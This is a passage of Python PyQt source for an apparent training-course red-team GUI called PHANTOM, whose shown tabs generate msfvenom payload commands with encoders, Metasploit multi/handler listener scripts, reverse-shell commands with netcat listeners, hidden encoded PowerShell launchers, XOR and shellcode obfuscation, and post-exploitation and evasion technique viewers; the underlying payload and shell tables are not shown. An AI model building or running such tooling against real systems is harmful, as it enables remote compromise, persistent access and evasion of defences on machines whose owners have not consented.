        QTimer.singleShot(1600, lambda: self.setText(old))


def btn_row_with_copy(target, extra_btns=None):
    """Returns an HBoxLayout with optional buttons + CopyBtn on right."""
    row = QHBoxLayout()
    if extra_btns:
        for b in extra_btns:
            row.addWidget(b)
    row.addStretch()
    row.addWidget(CopyBtn(target))
    return row


# ══════════════════════════════════════════════════════════════
#  TAB 1 — PAYLOAD CRAFTER
# ══════════════════════════════════════════════════════════════

class PayloadTab(QWidget):
    def __init__(self):
        super().__init__()
        lay = QVBoxLayout(self)
        lay.setSpacing(10)
        lay.setContentsMargins(18, 16, 18, 16)

        lay.addWidget(section_label("▸  MSFVENOM  PAYLOAD  BUILDER"))

        # ─ Config grid ─
        grid = QGridLayout()
        grid.setSpacing(10)
        grid.setColumnStretch(1, 2)
        grid.setColumnStretch(3, 2)

        lbl_style = f"color: {TEXT2}; font-size: 10px; font-weight: bold; letter-spacing: 1px;"

        lh = QLabel("LHOST"); lh.setStyleSheet(lbl_style); grid.addWidget(lh, 0, 0)
        self.lhost = QLineEdit("192.168.1.100"); grid.addWidget(self.lhost, 0, 1)

        lp = QLabel("LPORT"); lp.setStyleSheet(lbl_style); grid.addWidget(lp, 0, 2)
        self.lport = QLineEdit("4444"); self.lport.setFixedWidth(90); grid.addWidget(self.lport, 0, 3)

        pl = QLabel("PLATFORM"); pl.setStyleSheet(lbl_style); grid.addWidget(pl, 1, 0)
        self.plat_cb = QComboBox(); self.plat_cb.addItems(list(PAYLOADS.keys()))
        self.plat_cb.currentTextChanged.connect(self._update_payloads)
        grid.addWidget(self.plat_cb, 1, 1)

        pt = QLabel("PAYLOAD"); pt.setStyleSheet(lbl_style); grid.addWidget(pt, 1, 2)
        self.pay_cb = QComboBox(); grid.addWidget(self.pay_cb, 1, 3)

        fc = QLabel("FORMAT CAT"); fc.setStyleSheet(lbl_style); grid.addWidget(fc, 2, 0)
        self.fmt_cat = QComboBox(); self.fmt_cat.addItems(list(FORMATS.keys()))
        self.fmt_cat.currentTextChanged.connect(self._update_formats)
        grid.addWidget(self.fmt_cat, 2, 1)

        ff = QLabel("FORMAT"); ff.setStyleSheet(lbl_style); grid.addWidget(ff, 2, 2)
        self.fmt_cb = QComboBox(); grid.addWidget(self.fmt_cb, 2, 3)

        out = QLabel("OUTPUT FILE"); out.setStyleSheet(lbl_style); grid.addWidget(out, 3, 0)
        self.out_name = QLineEdit("payload"); grid.addWidget(self.out_name, 3, 1)

        enc_l = QLabel("ENCODER"); enc_l.setStyleSheet(lbl_style); grid.addWidget(enc_l, 3, 2)
        self.enc_cb = QComboBox(); self.enc_cb.addItems(ENCODERS)
        grid.addWidget(self.enc_cb, 3, 3)

        lay.addLayout(grid)

        # ─ Options row ─
        opt_row = QHBoxLayout()
        self.iter_check = QCheckBox("  Encoder Iterations:")
        self.iter_spin = QSpinBox(); self.iter_spin.setRange(1, 20); self.iter_spin.setValue(3); self.iter_spin.setFixedWidth(65)
        self.bad_check = QCheckBox("  No Bad Chars:")
        self.bad_chars = QLineEdit("\\x00\\x0a\\x0d"); self.bad_chars.setFixedWidth(160)
        opt_row.addWidget(self.iter_check); opt_row.addWidget(self.iter_spin)
        opt_row.addSpacing(20)
        opt_row.addWidget(self.bad_check); opt_row.addWidget(self.bad_chars)
        opt_row.addStretch()
        lay.addLayout(opt_row)

        # ─ Generate button ─
        gen_btn = QPushButton("⚡  GENERATE  MSFVENOM  COMMAND")
        gen_btn.setFixedHeight(44)
        gen_btn.clicked.connect(self._generate)
        lay.addWidget(gen_btn)

        # ─ Outputs ─
        lay.addWidget(section_label("▸  MSFVENOM  COMMAND"))
        self.cmd_out = TerminalOutput(80)
        lay.addWidget(self.cmd_out)
        lay.addLayout(btn_row_with_copy(self.cmd_out))

        lay.addWidget(section_label("▸  METASPLOIT  LISTENER  (multi/handler)"))
        self.listener_out = TerminalOutput(115)
        lay.addWidget(self.listener_out)
        lay.addLayout(btn_row_with_copy(self.listener_out))

        lay.addStretch()
        self._update_payloads(self.plat_cb.currentText())
        self._update_formats(self.fmt_cat.currentText())

    def _update_payloads(self, plat):
        self.pay_cb.clear()
        if plat in PAYLOADS:
            self.pay_cb.addItems(list(PAYLOADS[plat].keys()))

    def _update_formats(self, cat):
        self.fmt_cb.clear()
        if cat in FORMATS:
            self.fmt_cb.addItems(FORMATS[cat])

    def _generate(self):
        lhost    = self.lhost.text().strip() or "192.168.1.100"
        lport    = self.lport.text().strip() or "4444"
        plat     = self.plat_cb.currentText()
        ptype    = self.pay_cb.currentText()
        fmt      = self.fmt_cb.currentText()
        out_file = self.out_name.text().strip() or "payload"
        encoder  = self.enc_cb.currentText()
        payload  = PAYLOADS.get(plat, {}).get(ptype, "windows/x64/meterpreter/reverse_tcp")

        cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport}"

        if encoder != "none":
            cmd += f" -e {encoder}"
            if self.iter_check.isChecked():
                cmd += f" -i {self.iter_spin.value()}"

        if self.bad_check.isChecked() and self.bad_chars.text().strip():
            cmd += f" -b '{self.bad_chars.text().strip()}'"

        cmd += f" -f {fmt} -o {out_file}.{fmt}"
        self.cmd_out.setPlainText(cmd)

        listener = (
            f"use exploit/multi/handler\n"
            f"set PAYLOAD {payload}\n"
            f"set LHOST {lhost}\n"
            f"set LPORT {lport}\n"
            f"set ExitOnSession false\n"
            f"set AutoRunScript post/multi/manage/shell_to_meterpreter\n"
            f"exploit -j"
        )
        self.listener_out.setPlainText(listener)


# ══════════════════════════════════════════════════════════════
#  TAB 2 — REVERSE SHELL GENERATOR
# ══════════════════════════════════════════════════════════════

class ShellTab(QWidget):
    def __init__(self):
        super().__init__()
        lay = QVBoxLayout(self)
        lay.setSpacing(10)
        lay.setContentsMargins(18, 16, 18, 16)

        lay.addWidget(section_label("▸  REVERSE  SHELL  GENERATOR"))

        # IP/Port
        row = QHBoxLayout()
        row.addWidget(QLabel("LHOST:")); self.lhost = QLineEdit("192.168.1.100"); row.addWidget(self.lhost)
        row.addSpacing(14)
        row.addWidget(QLabel("LPORT:")); self.lport = QLineEdit("4444"); self.lport.setFixedWidth(90); row.addWidget(self.lport)
        row.addStretch()
        lay.addLayout(row)

        # Splitter: list left, output right
        split = QSplitter(Qt.Horizontal)

        # Left — shell list
        left_w = QWidget(); left_l = QVBoxLayout(left_w); left_l.setContentsMargins(0, 0, 0, 0)
        left_l.addWidget(section_label("▸  SHELL  TYPE"))
        self.shell_list = QListWidget()
        self.shell_list.addItems(list(SHELLS.keys()))
        self.shell_list.currentTextChanged.connect(self._show_shell)
        left_l.addWidget(self.shell_list)
        split.addWidget(left_w)

        # Right — output
        right_w = QWidget(); right_l = QVBoxLayout(right_w); right_l.setContentsMargins(8, 0, 0, 0)
        right_l.addWidget(section_label("▸  GENERATED  COMMAND"))
        self.shell_out = TerminalOutput()
        right_l.addWidget(self.shell_out)
        right_l.addLayout(btn_row_with_copy(self.shell_out, [
            self._make_gen_all_btn()
        ]))

        right_l.addWidget(section_label("▸  CATCH  LISTENER  (NETCAT)"))
        self.nc_out = TerminalOutput(56)
        right_l.addWidget(self.nc_out)
        right_l.addLayout(btn_row_with_copy(self.nc_out))

        split.addWidget(right_w)
        split.setSizes([220, 600])
        lay.addWidget(split)

        self.lhost.textChanged.connect(self._refresh)
        self.lport.textChanged.connect(self._refresh)
        self.shell_list.setCurrentRow(0)

    def _make_gen_all_btn(self):
        b = QPushButton("⚡  ALL SHELLS")
        b.setObjectName("amber")
        b.clicked.connect(self._gen_all)
        return b

    def _refresh(self, _=None):
        item = self.shell_list.currentItem()
        if item:
            self._show_shell(item.text())

    def _show_shell(self, name):
        if not name or name not in SHELLS:
            return
        lhost = self.lhost.text().strip() or "LHOST"
        lport = self.lport.text().strip() or "LPORT"
        try:
            shell = SHELLS[name].format(lhost=lhost, lport=lport)
        except Exception:
            shell = SHELLS[name]
        self.shell_out.setPlainText(shell)
        self.nc_out.setPlainText(f"nc -lvnp {lport}")

    def _gen_all(self):
        lhost = self.lhost.text().strip() or "LHOST"
        lport = self.lport.text().strip() or "LPORT"
        lines = []
        for name, tmpl in SHELLS.items():
            try:
                s = tmpl.format(lhost=lhost, lport=lport)
            except Exception:
                s = tmpl
            lines.append(f"# ── {name} ──\n{s}\n")
        self.shell_out.setPlainText("\n".join(lines))


# ══════════════════════════════════════════════════════════════
#  TAB 3 — ENCODER / OBFUSCATOR
# ══════════════════════════════════════════════════════════════

class EncoderTab(QWidget):
    def __init__(self):
        super().__init__()
        lay = QVBoxLayout(self)
        lay.setSpacing(10)
        lay.setContentsMargins(18, 16, 18, 16)

        lay.addWidget(section_label("▸  PAYLOAD  ENCODER  /  OBFUSCATOR"))

        lay.addWidget(QLabel("INPUT  ─  paste payload, command, or shellcode:"))
        self.inp = QTextEdit()
        self.inp.setPlaceholderText("Paste content to encode / decode / obfuscate...")
        self.inp.setFixedHeight(95)
        lay.addWidget(self.inp)

        xor_row = QHBoxLayout()
        xor_row.addWidget(QLabel("XOR KEY (hex):"))
        self.xor_key = QLineEdit("0x41"); self.xor_key.setFixedWidth(90)
        xor_row.addWidget(self.xor_key); xor_row.addStretch()
        lay.addLayout(xor_row)

        # Operation buttons
        ops = [
            ("Base64 Encode",      "amber",  self._b64_enc),
            ("Base64 Decode",      "amber",  self._b64_dec),
            ("URL Encode",         None,     self._url_enc),
            ("URL Decode",         None,     self._url_dec),
            ("Hex Encode",         None,     self._hex_enc),
            ("Hex Decode",         None,     self._hex_dec),
            ("XOR Encode",         None,     self._xor_enc),
            ("PowerShell B64",     "amber",  self._ps_b64),
            ("ROT-13",             None,     self._rot13),
            ("Reverse String",     None,     self._reverse),
            ("To Hex Shellcode",   None,     self._to_hex_sc),
            ("Strip Whitespace",   None,     self._strip_ws),
        ]

        grid = QGridLayout(); grid.setSpacing(8)
        for idx, (label, obj, func) in enumerate(ops):
            b = QPushButton(label)
            if obj:
                b.setObjectName(obj)
            b.clicked.connect(func)
            grid.addWidget(b, idx // 3, idx % 3)
        lay.addLayout(grid)

        lay.addWidget(section_label("▸  OUTPUT"))
        self.out = TerminalOutput(110)
        lay.addWidget(self.out)

        clr = QPushButton("✕  CLEAR ALL"); clr.setObjectName("red")
        clr.clicked.connect(lambda: [self.inp.clear(), self.out.clear()])
        swap = QPushButton("↕  SWAP  I/O"); swap.clicked.connect(self._swap)
        lay.addLayout(btn_row_with_copy(self.out, [clr, swap]))

        lay.addStretch()

    def _val(self):
        return self.inp.toPlainText()

    def _set(self, text):
        self.out.setPlainText(text)

    def _b64_enc(self):
        try: self._set(base64.b64encode(self._val().encode()).decode())
        except Exception as e: self._set(f"[ERROR] {e}")

    def _b64_dec(self):
        try: self._set(base64.b64decode(self._val().encode()).decode(errors="replace"))
        except Exception as e: self._set(f"[ERROR] {e}")

    def _url_enc(self): self._set(urllib.parse.quote(self._val()))
    def _url_dec(self): self._set(urllib.parse.unquote(self._val()))
    def _hex_enc(self): self._set(self._val().encode().hex())

    def _hex_dec(self):
        try: self._set(bytes.fromhex(self._val().strip()).decode(errors="replace"))
        except Exception as e: self._set(f"[ERROR] {e}")

    def _xor_enc(self):
        try:
            key = int(self.xor_key.text(), 16)
            result = bytes([b ^ key for b in self._val().encode()])
            self._set(result.hex())
        except Exception as e:
            self._set(f"[ERROR] {e}")

    def _ps_b64(self):
        try:
            enc = base64.b64encode(self._val().encode("utf-16-le")).decode()
            self._set(f"powershell -nop -w hidden -enc {enc}")
        except Exception as e:
            self._set(f"[ERROR] {e}")

    def _rot13(self):
        self._set(codecs.encode(self._val(), "rot_13"))

    def _reverse(self): self._set(self._val()[::-1])

    def _to_hex_sc(self):
        data = self._val().encode()
        parts = [f"\\x{b:02x}" for b in data]
        self._set("".join(parts))

    def _strip_ws(self):
        self._set(self._val().replace(" ", "").replace("\n", "").replace("\t", ""))

    def _swap(self):
        self.inp.setPlainText(self.out.toPlainText())
        self.out.clear()


# ══════════════════════════════════════════════════════════════
#  TAB 4/5 — POST-EXPLOITATION
# ══════════════════════════════════════════════════════════════

class PostExTab(QWidget):
    def __init__(self, os_label, data):
        super().__init__()
        self._data = data
        self._cmds = {}

        lay = QHBoxLayout(self)
        lay.setContentsMargins(10, 10, 10, 10)
        lay.setSpacing(10)

        # ─ Left: categories ─
        left = QWidget(); left.setFixedWidth(210)
        left_l = QVBoxLayout(left); left_l.setContentsMargins(0, 0, 0, 0)
        left_l.addWidget(section_label(f"▸  {os_label}  CATEGORIES"))
        self.cat_list = QListWidget()
        self.cat_list.addItems(list(data.keys()))
        self.cat_list.currentTextChanged.connect(self._show_cat)
        left_l.addWidget(self.cat_list)
        lay.addWidget(left)

        # ─ Right: commands + output ─
        right_l = QVBoxLayout()
        right_l.addWidget(section_label("▸  COMMANDS"))
        self.cmd_list = QListWidget()
        self.cmd_list.currentTextChanged.connect(self._show_cmd)
        right_l.addWidget(self.cmd_list)

        right_l.addWidget(section_label("▸  COMMAND"))
        self.cmd_out = TerminalOutput(110)
        right_l.addWidget(self.cmd_out)
        right_l.addLayout(btn_row_with_copy(self.cmd_out))

        lay.addLayout(right_l)

        if self.cat_list.count() > 0:
            self.cat_list.setCurrentRow(0)

    def _show_cat(self, cat):
        self.cmd_list.clear()
        self._cmds = {}
        if cat in self._data:
            for name, cmd in self._data[cat]:
                self.cmd_list.addItem(name)
                self._cmds[name] = cmd
        if self.cmd_list.count() > 0:
            self.cmd_list.setCurrentRow(0)

    def _show_cmd(self, name):
        if name in self._cmds:
            self.cmd_out.setPlainText(self._cmds[name])


# ══════════════════════════════════════════════════════════════
#  TAB 6 — EVASION TECHNIQUES
# ══════════════════════════════════════════════════════════════

class EvasionTab(QWidget):
    def __init__(self):
        super().__init__()
        self._techs = []

        lay = QHBoxLayout(self)
        lay.setContentsMargins(10, 10, 10, 10)
        lay.setSpacing(10)

        # ─ Left: categories ─
        left = QWidget(); left.setFixedWidth(210)
        left_l = QVBoxLayout(left); left_l.setContentsMargins(0, 0, 0, 0)
        left_l.addWidget(section_label("▸  EVASION  CATEGORIES"))
        self.cat_list = QListWidget()
        self.cat_list.addItems(list(EVASION_DATA.keys()))
        self.cat_list.currentTextChanged.connect(self._show_cat)
        left_l.addWidget(self.cat_list)
        lay.addWidget(left)

        # ─ Right ─
        right_l = QVBoxLayout()
        right_l.addWidget(section_label("▸  TECHNIQUES"))
        self.tech_list = QListWidget()
        self.tech_list.setFixedHeight(130)
        self.tech_list.currentRowChanged.connect(self._show_tech)
        right_l.addWidget(self.tech_list)

        right_l.addWidget(section_label("▸  DESCRIPTION"))
        self.desc_lbl = QLabel()
        self.desc_lbl.setWordWrap(True)
        self.desc_lbl.setStyleSheet(f"color: {TEXT2}; font-size: 11px; padding: 6px 4px; line-height: 1.5;")
        right_l.addWidget(self.desc_lbl)

        right_l.addWidget(section_label("▸  CODE  /  COMMAND"))
        self.code_out = TerminalOutput(150)
        right_l.addWidget(self.code_out)

        meta_row = QHBoxLayout()
        self.plat_lbl = QLabel()
        self.plat_lbl.setStyleSheet(f"color: {ACCENT}; font-size: 10px; font-weight: bold; letter-spacing: 1px;")
        meta_row.addWidget(self.plat_lbl); meta_row.addStretch()
        meta_row.addWidget(CopyBtn(self.code_out))
        right_l.addLayout(meta_row)

        lay.addLayout(right_l)

        if self.cat_list.count() > 0:
            self.cat_list.setCurrentRow(0)

    def _show_cat(self, cat):
        self.tech_list.clear()
        self._techs = EVASION_DATA.get(cat, [])
        for t in self._techs:
            self.tech_list.addItem(t["name"])
        if self.tech_list.count() > 0:
            self.tech_list.setCurrentRow(0)

    def _show_tech(self, idx):
        if 0 <= idx < len(self._techs):
            t = self._techs[idx]
            self.desc_lbl.setText(t["desc"])
            self.code_out.setPlainText(t["code"])
            self.plat_lbl.setText(f"◈  PLATFORM:  {t['platform']}")


# ══════════════════════════════════════════════════════════════
#  MAIN WINDOW
# ══════════════════════════════════════════════════════════════

class PhantomWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("PHANTOM  ─  Red Team Operations Suite  │  Cyber Warfare ZX310")
        self.setMinimumSize(1130, 790)
        self.setStyleSheet(STYLESHEET)

        root = QWidget()
        self.setCentralWidget(root)
        root_lay = QVBoxLayout(root)
        root_lay.setSpacing(0)
        root_lay.setContentsMargins(0, 0, 0, 0)

        # ═══ HEADER ═══
        header = QWidget()
        header.setFixedHeight(68)
        header.setStyleSheet(f"""
            background: qlineargradient(x1:0, y1:0, x2:1, y2:0,
                stop:0 {BG_DEEP}, stop:0.45 #060e1c, stop:0.55 #060e1c, stop:1 {BG_DEEP});
            border-bottom: 2px solid {ACCENT};
        """)
        h_lay = QHBoxLayout(header)
        h_lay.setContentsMargins(22, 0, 22, 0)

        logo = QLabel("⬡  PHANTOM")
        logo.setStyleSheet(f"""
            color: {ACCENT};
            font-size: 24px;
            font-weight: bold;
            letter-spacing: 8px;
            font-family: 'Consolas', monospace;
        """)
        h_lay.addWidget(logo)

        pipe = QLabel("│")
        pipe.setStyleSheet(f"color: {BORDER2}; font-size: 20px; margin: 0 14px;")
        h_lay.addWidget(pipe)

        sub = QLabel("Red Team Operations Suite  ·  Cyber Warfare  ·  ZX310")
        sub.setStyleSheet(f"color: {TEXT2}; font-size: 11px; letter-spacing: 2px;")
        h_lay.addWidget(sub)
        h_lay.addStretch()

        for label, color in [
            ("■ PAYLOAD ENGINE", GREEN),
            ("■ SHELL DB", GREEN),
            ("■ ENCODER", GREEN),
        ]:
            dot = QLabel(label)
            dot.setStyleSheet(f"color: {color}; font-size: 9px; letter-spacing: 1px; margin-left: 20px;")
            h_lay.addWidget(dot)

        root_lay.addWidget(header)

        # ═══ TABS ═══
        content = QWidget()
        content_lay = QVBoxLayout(content)
        content_lay.setContentsMargins(14, 12, 14, 8)

        self.tabs = QTabWidget()
        self.tabs.addTab(PayloadTab(),                    "⚡  PAYLOAD  CRAFTER")
        self.tabs.addTab(ShellTab(),                      "🔗  SHELL  GENERATOR")
        self.tabs.addTab(EncoderTab(),                    "🔐  ENCODER  /  OBFUSCATOR")
        self.tabs.addTab(PostExTab("WINDOWS", POST_WIN),  "🪟  POST-EX  ·  WIN")
        self.tabs.addTab(PostExTab("LINUX",   POST_LIN),  "🐧  POST-EX  ·  LINUX")
        self.tabs.addTab(EvasionTab(),                    "👻  EVASION  TECHNIQUES")

        content_lay.addWidget(self.tabs)
        root_lay.addWidget(content)

        # ═══ FOOTER ═══
        footer = QLabel(
            "  ⚠  FOR AUTHORIZED PENETRATION TESTING & EDUCATIONAL PURPOSES ONLY  "
            "─  John Bryce / ThinkCyber  ·  Cyberium Academy  ·  ZX310  Cyber Warfare"
        )
        footer.setAlignment(Qt.AlignCenter)
        footer.setStyleSheet(f"""
            background-color: #030508;
            color: {AMBER};
            font-size: 9px;
            letter-spacing: 2px;
            padding: 7px;
            border-top: 1px solid {BORDER2};
        """)
        root_lay.addWidget(footer)


# ══════════════════════════════════════════════════════════════
#  ENTRY POINT
# ══════════════════════════════════════════════════════════════

if __name__ == "__main__":
    app = QApplication(sys.argv)
    app.setApplicationName("PHANTOM")
    app.setApplicationDisplayName("PHANTOM - Red Team Operations Suite")
    win = PhantomWindow()
    win.show()
    sys.exit(app.exec_())
